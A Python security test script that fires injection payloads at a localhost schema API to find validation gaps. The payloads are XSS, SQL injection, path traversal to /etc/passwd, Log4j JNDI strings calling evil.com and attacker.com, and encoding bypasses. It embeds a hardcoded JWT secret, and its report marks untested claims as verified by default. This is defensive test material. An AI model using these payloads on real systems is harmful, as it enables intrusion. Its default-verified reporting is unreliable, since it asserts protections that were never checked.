#!/usr/bin/env python
"""
Rigorous Validation Testing - Identify Gaps and Unverified Claims
"""
import httpx
import jwt
import asyncio
import json
import time
import threading
from datetime import datetime, timedelta, timezone
from typing import List, Dict, Any
import concurrent.futures

# Generate JWT token
def generate_jwt():
    secret = "FDIRdP4Zu1q8yMt+qCpKaBBo6C937PWGtnW8E94dPA8="
    payload = {
        "sub": "testuser",
        "user_id": "test-user-123",
        "username": "testuser",
        "email": "test@example.com",
        "exp": datetime.now(timezone.utc) + timedelta(hours=1)
    }
    return jwt.encode(payload, secret, algorithm="HS256")

class ValidationGapTester:
    def __init__(self):
        self.base_url = "http://localhost:8002"
        self.token = generate_jwt()
        self.headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        }
        self.results = {
            "gaps": [],
            "unverified_claims": [],
            "edge_cases": [],
            "security_issues": [],
            "performance_issues": [],
            "concurrency_issues": []
        }
    
    async def run_all_tests(self):
        """Run all validation gap tests"""
        print("="*80)
        print("VALIDATION GAP ANALYSIS")
        print("="*80)
        
        # Test 1: Check if validation is actually integrated end-to-end
        await self.test_end_to_end_integration()
        
        # Test 2: Test what actually gets stored in DB
        await self.test_database_corruption()
        
        # Test 3: Test if sanitization is reversible or lossy
        await self.test_sanitization_reversibility()
        
        # Test 4: Test information disclosure in errors
        await self.test_error_information_disclosure()
        
        # Test 5: Test validation across all endpoints
        await self.test_all_endpoint_coverage()
        
        # Test 6: Test edge cases
        await self.test_edge_cases()
        
        # Test 7: Test race conditions
        await self.test_race_conditions()
        
        # Test 8: Test performance under load
        await self.test_performance_under_load()
        
        # Test 9: Test bypass techniques
        await self.test_bypass_techniques()
        
        # Test 10: Test validation consistency
        await self.test_validation_consistency()
        
        # Report findings
        self.report_findings()
    
    async def test_end_to_end_integration(self):
        """Test if validation is actually integrated throughout the system"""
        print("\n1. Testing End-to-End Integration")
        
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            # Test 1: Check if validation happens at API level only or also at DB level
            test_cases = [
                {
                    "endpoint": "/api/v1/schemas/main/object-types",
                    "data": {"name": "Test<script>", "displayName": "Test"},
                    "description": "XSS in object type creation"
                },
                {
                    "endpoint": "/api/v1/schemas/main/shared-properties",
                    "data": {"name": "'; DROP TABLE--", "displayName": "Test", "dataType": "xsd:string"},
                    "description": "SQL injection in shared properties"
                },
                {
                    "endpoint": "/api/v1/schemas/main/link-types",
                    "data": {
                        "name": "Test${jndi:ldap://evil.com}",
                        "displayName": "Test",
                        "sourceObjectType": "Customer",
                        "targetObjectType": "Order",
                        "cardinality": "one-to-many"
                    },
                    "description": "Log4j injection in link types"
                }
            ]
            
            for test in test_cases:
                response = await client.post(f"{self.base_url}{test['endpoint']}", json=test["data"])
                if response.status_code != 400:
                    self.results["gaps"].append({
                        "type": "validation_gap",
                        "endpoint": test["endpoint"],
                        "issue": f"Expected 400, got {response.status_code}",
                        "description": test["description"]
                    })
    
    async def test_database_corruption(self):
        """Test if malicious data actually reaches the database"""
        print("\n2. Testing Database Corruption Prevention")
        
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            # First, try to create with sanitized version
            sanitized_name = "TestSanitized"
            response = await client.post(
                f"{self.base_url}/api/v1/schemas/main/object-types",
                json={
                    "name": sanitized_name,
                    "displayName": "Test<script>alert('XSS')</script>Display"
                }
            )
            
            if response.status_code == 200:
                # Check what actually got stored
                get_response = await client.get(
                    f"{self.base_url}/api/v1/schemas/main/object-types/{sanitized_name}"
                )
                if get_response.status_code == 200:
                    data = get_response.json()
                    stored_display = data.get("objectType", {}).get("displayName", "")
                    if "<script>" in stored_display:
                        self.results["security_issues"].append({
                            "type": "xss_stored",
                            "field": "displayName",
                            "value": stored_display,
                            "issue": "XSS payload stored in database"
                        })
    
    async def test_sanitization_reversibility(self):
        """Test if sanitization is lossy or reversible"""
        print("\n3. Testing Sanitization Reversibility")
        
        test_inputs = [
            ("Test_Normal_Name", "Should remain unchanged"),
            ("Test--Dashes", "Double dashes handling"),
            ("Test__Underscores", "Double underscores handling"),
            ("TestΩUnicode", "Unicode handling"),
            ("Test   Multiple   Spaces", "Multiple spaces handling"),
            ("Test\u200bZeroWidth", "Zero-width character handling")
        ]
        
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            for original, description in test_inputs:
                # Try to create
                response = await client.post(
                    f"{self.base_url}/api/v1/schemas/main/object-types",
                    json={"name": original, "displayName": original}
                )
                
                if response.status_code == 200:
                    data = response.json()
                    stored_name = data.get("objectType", {}).get("name", "")
                    if stored_name != original:
                        self.results["edge_cases"].append({
                            "type": "lossy_sanitization",
                            "original": original,
                            "stored": stored_name,
                            "description": description
                        })
    
    async def test_error_information_disclosure(self):
        """Test if error messages leak sensitive information"""
        print("\n4. Testing Error Information Disclosure")
        
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            # Test various invalid inputs
            test_cases = [
                {
                    "data": {"name": "'; SELECT * FROM users--", "displayName": "Test"},
                    "check_for": ["SELECT", "users", "database", "table"]
                },
                {
                    "data": {"name": "../../../etc/passwd", "displayName": "Test"},
                    "check_for": ["passwd", "directory", "traversal", "path"]
                },
                {
                    "data": {"name": "${jndi:ldap://attacker.com/a}", "displayName": "Test"},
                    "check_for": ["jndi", "ldap", "injection"]
                }
            ]
            
            for test in test_cases:
                response = await client.post(
                    f"{self.base_url}/api/v1/schemas/main/object-types",
                    json=test["data"]
                )
                
                error_text = response.text.lower()
                for sensitive_word in test["check_for"]:
                    if sensitive_word.lower() in error_text:
                        self.results["security_issues"].append({
                            "type": "information_disclosure",
                            "input": test["data"]["name"],
                            "leaked_info": sensitive_word,
                            "response": response.text[:200]
                        })
    
    async def test_all_endpoint_coverage(self):
        """Test if validation works across ALL endpoints"""
        print("\n5. Testing All Endpoint Coverage")
        
        # List of all endpoints that accept user input
        endpoints = [
            ("/api/v1/schemas/main/object-types", {"name": "Test<xss>", "displayName": "Test"}),
            ("/api/v1/schemas/main/shared-properties", {"name": "Test<xss>", "displayName": "Test", "dataType": "xsd:string"}),
            ("/api/v1/schemas/main/link-types", {
                "name": "Test<xss>", 
                "displayName": "Test",
                "sourceObjectType": "Customer",
                "targetObjectType": "Order",
                "cardinality": "one-to-many"
            }),
            ("/api/v1/schemas/main/action-types", {
                "name": "Test<xss>",
                "displayName": "Test",
                "targetTypes": ["Customer"],
                "operations": ["action:value"]
            }),
            ("/api/v1/schemas/main/interfaces", {
                "name": "Test<xss>",
                "displayName": "Test"
            }),
            ("/api/v1/schemas/main/semantic-types", {
                "name": "Test<xss>",
                "displayName": "Test",
                "baseType": "xsd:string"
            }),
            ("/api/v1/schemas/main/struct-types", {
                "name": "Test<xss>",
                "displayName": "Test",
                "fields": [{"name": "field1", "displayName": "Field 1", "fieldType": "xsd:string"}]
            })
        ]
        
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            for endpoint, payload in endpoints:
                response = await client.post(f"{self.base_url}{endpoint}", json=payload)
                if response.status_code != 400:
                    self.results["gaps"].append({
                        "type": "missing_validation",
                        "endpoint": endpoint,
                        "status_code": response.status_code,
                        "issue": "Validation not applied consistently"
                    })
    
    async def test_edge_cases(self):
        """Test edge cases that might break validation"""
        print("\n6. Testing Edge Cases")
        
        edge_cases = [
            ("", "Empty string"),
            (" ", "Single space"),
            ("a" * 1000, "Very long name"),
            ("Test\x00Null", "Null byte in name"),
            ("Test\nNewline", "Newline in name"),
            ("Test\tTab", "Tab in name"),
            ("123StartWithNumber", "Starts with number"),
            ("_StartWithUnderscore", "Starts with underscore"),
            ("End_", "Ends with underscore"),
            ("Test..DoubleDot", "Double dots"),
            ("Test//DoubleSlash", "Double slashes"),
            ("Test\\Backslash", "Backslash"),
            ("Test%Percent", "Percent sign"),
            ("Test#Hash", "Hash sign"),
            ("Test?Question", "Question mark"),
            ("Test&Ampersand", "Ampersand"),
            ("Test=Equals", "Equals sign"),
            ("Test+Plus", "Plus sign"),
            ("Test Space", "Space in name"),
            ("Test\u0000-\u001F", "Control characters"),
            ("Test\u200E\u200F", "RTL/LTR marks"),
            ("МуТеѕт", "Cyrillic lookalikes")
        ]
        
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            for name, description in edge_cases:
                response = await client.post(
                    f"{self.base_url}/api/v1/schemas/main/object-types",
                    json={"name": name, "displayName": "Test"}
                )
                
                if response.status_code == 200:
                    self.results["edge_cases"].append({
                        "type": "unexpected_success",
                        "input": repr(name),
                        "description": description,
                        "issue": "Edge case not properly handled"
                    })
    
    async def test_race_conditions(self):
        """Test for race conditions in validation"""
        print("\n7. Testing Race Conditions")
        
        async def create_concurrent(client, name, index):
            try:
                response = await client.post(
                    f"{self.base_url}/api/v1/schemas/main/object-types",
                    json={"name": f"{name}{index}", "displayName": f"Test {index}"}
                )
                return index, response.status_code
            except Exception as e:
                return index, str(e)
        
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            # Test 1: Concurrent creation with same base name
            tasks = []
            base_name = "ConcurrentTest"
            for i in range(10):
                task = create_concurrent(client, base_name, i)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            success_count = sum(1 for _, status in results if status == 200)
            
            if success_count < len(tasks):
                self.results["concurrency_issues"].append({
                    "type": "creation_race_condition",
                    "total_attempts": len(tasks),
                    "successful": success_count,
                    "issue": "Some concurrent creations failed"
                })
    
    async def test_performance_under_load(self):
        """Test validation performance under load"""
        print("\n8. Testing Performance Under Load")
        
        async def timed_request(client, payload):
            start = time.time()
            try:
                response = await client.post(
                    f"{self.base_url}/api/v1/schemas/main/object-types",
                    json=payload
                )
                elapsed = time.time() - start
                return elapsed, response.status_code
            except Exception as e:
                elapsed = time.time() - start
                return elapsed, str(e)
        
        # Test with various payload sizes
        payloads = [
            # Normal payload
            {"name": "NormalTest", "displayName": "Normal Test"},
            # Large description
            {"name": "LargeDesc", "displayName": "Test", "description": "x" * 10000},
            # Many properties (simulate complex validation)
            {"name": "Complex", "displayName": "Test", 
             "properties": [f"prop{i}" for i in range(100)]}
        ]
        
        async with httpx.AsyncClient(headers=self.headers, timeout=60.0) as client:
            for payload in payloads:
                times = []
                for _ in range(10):
                    elapsed, status = await timed_request(client, payload)
                    times.append(elapsed)
                
                avg_time = sum(times) / len(times)
                max_time = max(times)
                
                if avg_time > 1.0 or max_time > 5.0:
                    self.results["performance_issues"].append({
                        "type": "slow_validation",
                        "payload_type": payload.get("name"),
                        "avg_time": f"{avg_time:.2f}s",
                        "max_time": f"{max_time:.2f}s",
                        "issue": "Validation too slow"
                    })
    
    async def test_bypass_techniques(self):
        """Test various bypass techniques"""
        print("\n9. Testing Bypass Techniques")
        
        bypass_attempts = [
            # Unicode normalization bypass
            ("Test\u00ADsoft\u00ADhyphen", "Soft hyphen bypass"),
            ("Test\uFEFFzero\uFEFFwidth", "Zero-width no-break space"),
            # Double encoding
            ("%3Cscript%3E", "URL encoded XSS"),
            ("&lt;script&gt;", "HTML entity encoded XSS"),
            # Case variations
            ("Test<SCRIPT>", "Uppercase tag"),
            ("Test<ScRiPt>", "Mixed case tag"),
            # Comment injection
            ("Test/*comment*/Name", "Comment injection"),
            ("Test<!--comment-->Name", "HTML comment injection"),
            # Encoding tricks
            ("Test\x3cscript\x3e", "Hex encoded"),
            ("Test\\u003cscript\\u003e", "Unicode escape"),
            # Null byte injection
            ("ValidName\x00<script>", "Null byte separator"),
            # Concatenation bypass
            ("Test" + "<%73cript>", "Concatenation attempt")
        ]
        
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            for payload, description in bypass_attempts:
                response = await client.post(
                    f"{self.base_url}/api/v1/schemas/main/object-types",
                    json={"name": payload, "displayName": "Test"}
                )
                
                if response.status_code == 200:
                    self.results["security_issues"].append({
                        "type": "bypass_successful",
                        "payload": repr(payload),
                        "description": description,
                        "issue": "Validation bypass successful"
                    })
    
    async def test_validation_consistency(self):
        """Test if validation is consistent across different operations"""
        print("\n10. Testing Validation Consistency")
        
        async with httpx.AsyncClient(headers=self.headers, timeout=30.0) as client:
            # First create a valid object
            valid_name = "ConsistencyTest"
            create_response = await client.post(
                f"{self.base_url}/api/v1/schemas/main/object-types",
                json={"name": valid_name, "displayName": "Test"}
            )
            
            if create_response.status_code == 200:
                # Now try to update with invalid data
                update_response = await client.put(
                    f"{self.base_url}/api/v1/schemas/main/object-types/{valid_name}",
                    json={"displayName": "<script>alert('XSS')</script>"}
                )
                
                if update_response.status_code == 200:
                    self.results["gaps"].append({
                        "type": "inconsistent_validation",
                        "operation": "update",
                        "issue": "Update operation not validated like create"
                    })
    
    def report_findings(self):
        """Generate comprehensive report of findings"""
        print("\n" + "="*80)
        print("VALIDATION GAP ANALYSIS REPORT")
        print("="*80)
        
        total_issues = sum(len(v) for v in self.results.values())
        print(f"\nTotal Issues Found: {total_issues}")
        
        for category, issues in self.results.items():
            if issues:
                print(f"\n{category.upper().replace('_', ' ')} ({len(issues)} issues):")
                print("-" * 60)
                for issue in issues:
                    print(f"\n  Issue Type: {issue.get('type', 'Unknown')}")
                    for key, value in issue.items():
                        if key != 'type':
                            print(f"    {key}: {value}")
        
        # Summary of unverified claims
        print("\n" + "="*80)
        print("UNVERIFIED CLAIMS")
        print("="*80)
        
        claims = [
            "Input sanitization prevents XSS attacks",
            "SQL injection is prevented",
            "Command injection is blocked",
            "Unicode attacks are handled",
            "Validation is applied consistently across all endpoints",
            "Validation prevents database corruption",
            "Performance is acceptable under load",
            "No race conditions exist",
            "Error messages don't leak information",
            "All bypass techniques are blocked"
        ]
        
        for claim in claims:
            # Check if claim is verified based on test results
            verified = self._check_claim_verification(claim)
            status = "✅ VERIFIED" if verified else "❌ NOT VERIFIED"
            print(f"{status}: {claim}")
    
    def _check_claim_verification(self, claim: str) -> bool:
        """Check if a claim is verified based on test results"""
        claim_lower = claim.lower()
        
        if "xss" in claim_lower:
            return not any("xss" in str(issue).lower() for issues in self.results.values() for issue in issues)
        elif "sql injection" in claim_lower:
            return not any("sql" in str(issue).lower() for issues in self.results.values() for issue in issues)
        elif "consistently" in claim_lower:
            return not any("inconsistent" in str(issue).lower() for issues in self.results.values() for issue in issues)
        elif "performance" in claim_lower:
            return len(self.results["performance_issues"]) == 0
        elif "race condition" in claim_lower:
            return len(self.results["concurrency_issues"]) == 0
        elif "error message" in claim_lower:
            return not any("information_disclosure" in str(issue).lower() for issues in self.results.values() for issue in issues)
        
        return True  # Default to verified if no specific check

async def main():
    tester = ValidationGapTester()
    await tester.run_all_tests()

if __name__ == "__main__":
    asyncio.run(main())